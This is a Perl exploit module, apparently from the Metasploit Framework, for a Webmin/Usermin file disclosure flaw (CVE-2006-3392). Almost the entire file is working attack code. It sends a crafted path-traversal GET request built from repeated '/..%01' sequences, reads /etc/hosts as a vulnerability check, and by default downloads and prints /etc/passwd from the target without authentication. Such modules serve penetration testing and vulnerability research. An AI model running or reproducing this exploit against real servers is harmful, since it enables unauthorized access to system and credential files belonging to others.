
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::webmin_file_disclosure;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'Webmin file disclosure',
	'Version'  => '$Rev: $',
	'Authors'  => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 10000],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'   => [1, 'DATA', 'Webmin directory path', '/unauthenticated'],
		'RPATH' => [1, 'DATA', 'The file to download', '/etc/passwd'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	},

	'Description' => Pex::Text::Freeform(qq{
		A vulnerability has been reported in Webmin and Usermin, which can be
		exploited by malicious people to disclose potentially sensitive information.
		The vulnerability is caused due to an unspecified error within the handling
		of an URL. This can be exploited to read the contents of any files on the
		server via a specially crafted URL, without requiring a valid login.

		The vulnerability has been reported in Webmin (versions prior to 1.290) and
		Usermin (versions prior to 1.220).
	}),

	'Refs' => 
	[
		['OSVDB', '26772'],
		['BID', '18744'],
		['CVE', '2006-3392'],
		['MIL', '2017'],
		['URL', 'http://www.kb.cert.org/vuls/id/999601'],
		['URL', 'http://secunia.com/advisories/20892/'],
	],

	'Keys' => ['webmin', 'usermin'],

	'DisclosureDate' => 'Jun 30 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $encodedPayload = $self->GetVar('EncodedPayload');

	my $remotefile = Pex::Text::URLEncode("/etc/hosts");

	my $p = "/..%01" x 40;

	$dir = $dir.$p.$remotefile;
	
	my $request =
		"GET $dir HTTP/1.1\r\n".
		"Accept: */*\r\n".
		"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		"Host: $target_host:$target_port\r\n".
		"Connection: Close\r\n".
		"\r\n";
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	);

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 20);

	if ($results =~ /localhost/ism) {
		$self->PrintLine("[*] Appears to be vulnerable.");
	} else {
		$self->PrintLine("[*] Does not appear to be vulnerable.");
	}

	$s->Close();

	return;
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $remotefile     = $self->GetVar('RPATH');

	$remotefile = Pex::Text::URLEncode($remotefile);

	my $p = "/..%01" x 40;

	$dir = $dir.$p.$remotefile;

	my $request =
		"GET $dir HTTP/1.1\r\n".
		"Accept: */*\r\n".
		"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		"Host: $target_host:$target_port\r\n".
		"Connection: Close\r\n".
		"\r\n";
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	);

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);

	my $results = $s->Recv(-1, 20);
	
	$self->PrintLine("[*] Get the remote file...");

	if ($results){
		(undef, $results) = split(/Connection: close\r\n/, $results);
		$self->PrintLine($results);
	} else {
		$self->PrintLine('[*] Error, file not found.');
	}

	$s->Close();

	return;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;
